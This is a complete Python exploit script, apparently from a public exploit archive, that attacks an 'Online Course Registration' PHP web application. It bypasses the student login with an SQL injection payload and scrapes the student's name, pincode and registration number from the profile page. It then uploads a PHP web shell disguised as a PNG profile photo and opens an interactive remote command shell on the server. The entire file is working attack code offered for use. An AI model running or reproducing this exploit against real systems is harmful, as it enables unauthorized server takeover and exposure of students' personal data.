# Exploit Title:
# Exploit Author: Bobby Cooke
# Date: 
# Vendor Homepage: 
# Software Link: 
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
ok = Fore.GREEN+'['+Fore.RESET+'+'+Fore.GREEN+']'+Fore.RESET+' '
err = Fore.RED+'['+Fore.RESET+'!'+Fore.RED+']'+Fore.RESET+' '
info = Fore.BLUE+'['+Fore.RESET+'-'+Fore.BLUE+']'+Fore.RESET+' '
RS   = Style.RESET_ALL
FR   = Fore.RESET
YL   = Fore.YELLOW
RD   = Fore.RED

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'studentphoto/kaio-ken.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.post(url=WEB_SHELL, data=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print(err+"Could not connect to the webshell.")
            r2.raise_for_status()
        print(ok+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        print(RD+')'+YL+'+++++'+RD+'['+FR+'=========>'+'     WELCOME BOKU     '+'<========'+RD+']'+YL+'+++++'+RD+'('+FR)
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print('\r\n'+err+'Webshell session failed. Quitting.')
        quit()

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    SIG  = RD+'            /\\\n'+RS
    SIG += YL+'/vvvvvvvvvvvv '+RD+'\\'+FR+'--------------------------------------,\n'
    SIG += YL+'`^^^^^^^^^^^^'+RD+' /'+FR+'============'+RD+'BOKU'+FR+'====================="\n'
    SIG += RD+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/Online Course Registration/'" % sys.argv[0])
        quit()
    SERVER_URL = sys.argv[1]
    if re.match(r".*/$", SERVER_URL):
        print('Yes')
    else:
        SERVER_URL = SERVER_URL+'/'
    LOGIN_URL  = SERVER_URL+'index.php'
    PROFILE_URL = SERVER_URL+'my-profile.php'
    print(info+'Creating session and saving PHPSESSID')
    s = requests.Session()
    get_session = s.get(SERVER_URL, verify=False)
    if get_session.status_code == 200:
        print(ok+'Successfully connected to server and created session.')
        print(info+get_session.headers['Set-Cookie'])
    else:
        print(err+'Cannot connect to the server and create a web session.')
    bypass_data = {'regno' : '\' or 1=1; -- boku', 'password' : '\' or 1=1; -- boku', 'submit' : ''}
    print(info+'Bypassing authentication of student login portal.')
    auth_bypass = s.post(url=LOGIN_URL, data=bypass_data, verify=False)
    if auth_bypass.history:
        for resp in auth_bypass.history:
            print(info+'Response Status-Code: ' + str(resp.status_code))
            print(info+'Location: ' + str(resp.headers['location']))
            redirectURL = resp.headers['location']
            if re.match(r".*change-password.php", redirectURL):
                print(ok+'Successfully bypassed user portal authentication.')
            else:
                print(err+'Failed to bypass user portal authentication. Quitting.')
                quit()
    get_profile = s.get(url=PROFILE_URL, verify=False)
    Name = str(re.findall(r'name="studentname" value=".*"', get_profile.text))
    Name = re.sub('^.*name="studentname" value="', '', Name)
    Name = re.sub('".*$', '', Name)
    PinCode = str(re.findall(r'name="Pincode" readonly value=".*"', get_profile.text))
    PinCode = re.sub('^.*name="Pincode" readonly value="', '', PinCode)
    PinCode = re.sub('".*$', '', PinCode)
    RegNo = str(re.findall(r'name="studentregno" value=".*"', get_profile.text))
    RegNo = re.sub('^.*name="studentregno" value="', '', RegNo)
    RegNo = re.sub('".*$', '', RegNo)
    print(ok+'{studentname:'+Name+', Pincode:'+PinCode+', studentregno:'+RegNo+'}')
    avatar_img  = {
                'photo': 
                  (
                    'kaio-ken.php', 
                    '<?php echo shell_exec($_REQUEST["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    upld_data = {'studentname':Name, 'studentregno':RegNo,'Pincode':PinCode,'cgpa':'0.00','submit':''}
    webshell_upload = s.post(url=PROFILE_URL, files=avatar_img, data=upld_data, verify=False)
    print(ok+'Uploaded webshell. Now connecting via POST requests using telepathy.')
    webshell(SERVER_URL, s)